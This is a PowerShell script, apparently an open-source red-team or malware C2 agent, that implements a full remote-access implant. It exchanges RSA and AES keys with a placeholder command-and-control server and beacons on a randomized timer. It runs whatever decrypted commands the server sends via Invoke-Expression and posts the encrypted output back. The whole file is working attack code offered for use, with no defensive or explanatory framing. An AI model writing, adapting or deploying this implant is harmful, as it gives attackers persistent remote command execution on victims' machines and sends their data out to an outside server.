########################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#########################################################################################################################################################################################################################

$ErrorActionPreference = "Stop"

# Function to load or generate AgentID
Function Load-AgentID {
    Param ([string]$FilePath)
    If (Test-Path $FilePath) {
        return (Get-Content $FilePath -Raw).Trim()
    } Else {
        $AgentID = [guid]::NewGuid().ToString()
        Set-Content -Path $FilePath -Value $AgentID
        return $AgentID
    }
}

# AES-GCM Encryption function
Function Encrypt-Result-GCM {
    Param ([string]$PlainText, [byte[]]$AESKey)

    # Validate AES Key Length
    If ($AESKey.Length -ne 32) {
        Throw "AES Key must be 32 bytes!"
    }

    $Nonce = New-Object byte[] 12  # 96-bit Nonce
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($Nonce)

    $AEAD = [System.Security.Cryptography.AesGcm]::new($AESKey)
    $PlainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $CipherText = New-Object byte[] $PlainTextBytes.Length
    $Tag = New-Object byte[] 16  # 128-bit authentication tag

    $AEAD.Encrypt($Nonce, $PlainTextBytes, $CipherText, $Tag)
    return [Convert]::ToBase64String($Nonce + $CipherText + $Tag)
}

# AES-GCM Decryption function with detailed debug statements
Function Decrypt-Data {
    Param ([byte[]]$Data, [byte[]]$AESKey)

    If ($AESKey.Length -ne 32) {
        Throw "AES Key must be 32 bytes!"
    }

    Try {
        $Nonce = $Data[0..11]
        $CipherText = $Data[12..($Data.Length-17)]
        $Tag = $Data[($Data.Length-16)..($Data.Length-1)]

        Write-Host "[DEBUG] Nonce (Base64): $([Convert]::ToBase64String($Nonce))"
        Write-Host "[DEBUG] CipherText (Base64): $([Convert]::ToBase64String($CipherText))"
        Write-Host "[DEBUG] Tag (Base64): $([Convert]::ToBase64String($Tag))"
        Write-Host "[DEBUG] AES Key (Base64): $([Convert]::ToBase64String($AESKey))"

        $AEAD = [System.Security.Cryptography.AesGcm]::new($AESKey)
        $PlainTextBytes = New-Object byte[] $CipherText.Length

        $AEAD.Decrypt($Nonce, $CipherText, $Tag, $PlainTextBytes)
        $DecryptedText = [System.Text.Encoding]::UTF8.GetString($PlainTextBytes)

        Write-Host "Decryption successful: $DecryptedText"
        return $DecryptedText
    }
    Catch {
        Write-Host "Decryption Error: $_"
        $_ | Out-File -FilePath "C:\Temp\decryption_error.log" -Append
        return $null
    }
}

# Function to send beacon
Function Send-Beacon {
    Param ([string]$AgentID, [string]$C2Url, [byte[]]$AESKey)

    Try {
        $Body = @{ AgentID = $AgentID } | ConvertTo-Json -Compress
        $Response = Invoke-RestMethod -Uri "$C2Url/beacon" -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($Body)) -ContentType "application/json; charset=utf-8"
        
        $EncryptedCommand = $Response.data
        Write-Host "Encrypted command received: $EncryptedCommand"

        Execute-Command -ServerURL $C2Url -AgentID $AgentID -Key $AESKey -Command $EncryptedCommand
    }
    Catch {
        Write-Host "Error in Send-Beacon: $_"
        $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
    }
}

# Function to send execution result
Function Send-Result {
    Param (
        [string]$ServerURL,
        [string]$AgentID,
        [string]$Result,
        [byte[]]$AESKey
    )

    Try {
        $EncryptedResult = Encrypt-Result-GCM -PlainText $Result -AESKey $AESKey
        $Body = @{ AgentID = $AgentID; Result = $EncryptedResult } | ConvertTo-Json -Compress

        Invoke-RestMethod -Uri "$ServerURL/result" -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($Body)) -ContentType "application/json; charset=utf-8"
    }
    Catch {
        Write-Host "Error in Send-Result: $_"
        $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
    }
}

# Function to execute command
Function Execute-Command {
    Param (
        [string]$ServerURL,
        [string]$AgentID,
        [byte[]]$AESKey,
        [string]$Command
    )
    Try {
        Log-Message "Decrypting command..."
        $DecryptedCommand = Decrypt-Data -Data ([Convert]::FromBase64String($Command)) -AESKey $AESKey
        Log-Message "Decrypted Command: $DecryptedCommand"
        If ($DecryptedCommand -ne "NoCommand") {
            Log-Message "Executing command: $DecryptedCommand"
            # Execute PowerShell command directly and convert the result to a string
            $Result = Invoke-Expression -Command $DecryptedCommand | Out-String
            Log-Message "Command execution result: $Result"
            Log-Message "Sending result..."
            Send-Result -ServerURL $ServerURL -AgentID $AgentID -Result $Result -AESKey $AESKey
        } Else {
            Log-Message "No commands to execute."
        }
    } Catch {
        Log-Message "Error in Execute-Command: $_"
    }
}

# Function to log messages
Function Log-Message {
    Param ([string]$Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$Timestamp - $Message" | Out-File -FilePath "C:\Temp\powershell_execution.log" -Append
}

# Function to import RSA key
Function Import-RSAKey {
    Param ([string]$PublicKeyXML)
    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
    $rsa.FromXmlString($PublicKeyXML)
    Return $rsa
}

# Main Execution
Try {
    $AgentIDFilePath = "C:\Temp\agent_id.txt"
    $AgentID = Load-AgentID -FilePath $AgentIDFilePath
    $C2Url = "http://c2_server_or_IP:8080"

    $PublicKeyResponse = Invoke-RestMethod -Uri "$C2Url/public_key" -Method GET
    $RSA = Import-RSAKey -PublicKeyXML $PublicKeyResponse.PublicKey

    $AESKey = New-Object byte[] 32
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($AESKey)
    
    $EncryptedAESKey = $RSA.Encrypt($AESKey, $true)
    $Body = @{ AgentID = $AgentID; EncAESKey = [Convert]::ToBase64String($EncryptedAESKey) } | ConvertTo-Json -Compress

    Invoke-RestMethod -Uri "$C2Url/exchange_key" -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($Body)) -ContentType "application/json; charset=utf-8"

    $CheckinBody = @{ AgentID = $AgentID } | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri "$C2Url/checkin" -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($CheckinBody)) -ContentType "application/json; charset=utf-8"

    Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 60)

    While ($true) {
        Send-Beacon -AgentID $AgentID -C2Url $C2Url -AESKey $AESKey
        Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
    }
}
Catch {
    Write-Host "Error in main execution: $_"
    $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
    Start-Sleep -Seconds 10
}
